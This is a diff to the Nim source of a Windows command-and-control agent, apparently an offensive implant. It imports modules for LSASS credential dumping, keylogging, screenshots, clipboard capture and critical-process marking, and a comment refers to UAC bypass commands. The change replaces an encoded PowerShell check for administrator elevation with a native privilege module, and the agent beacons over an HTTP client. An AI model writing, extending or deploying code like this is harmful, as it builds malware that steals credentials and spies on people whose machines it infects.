@@ -2,7 +2,7 @@
 import ../config
 import ../common
 import utils/incl/[evillsasstwin]
-import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical]
+import utils/[audio, clipboard, clr, helpers, memops, lsass, screenshot, keylogger, mutex, critical, priv]
 # External imports
 import std/[tables, nativesockets, json]
 import wAuto/[registry, window]
@@ -49,7 +49,6 @@ proc wrap_set_critical(is_critical: bool): bool
 
 # Helpers
 proc get_windows_agent_id*(): string
-proc is_elevated_str(): string
 
 # Globals
 let client = newHttpClient(userAgent=get_windows_agent_id())
@@ -93,7 +92,7 @@ proc collect_data(): bool =
     except:
         is_admin = could_not_retrieve
     try:
-        is_elevated = is_elevated_str()
+        is_elevated = capitalizeAscii($is_elevated())
     except:
         is_elevated = could_not_retrieve
     try: 
@@ -613,10 +612,6 @@ proc get_windows_agent_id*(): string =
     return uaid.toLower()
 
 
-proc is_elevated_str(): string =
-    return execute_encoded_powershell(protectString("KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEkAZABlAG4AdABpAHQAeQBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0ACgAKQApACkALgBJAHMASQBuAFIAbwBsAGUAKAAiAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAiACkA"))
-
-
 ##########################
 ##### Core functions #####
 ##########################
@@ -625,7 +620,7 @@ proc is_elevated_str(): string =
 proc windows_start*(): void =
 
     # if elevated - let the unelevated agent know (needed for uac bypass commands)
-    if is_elevated_str().strip() == protectString("True"):
+    if is_elevated():
         discard create_elevated_mutex()
     
     sleep(sleep_on_execution * 1000)
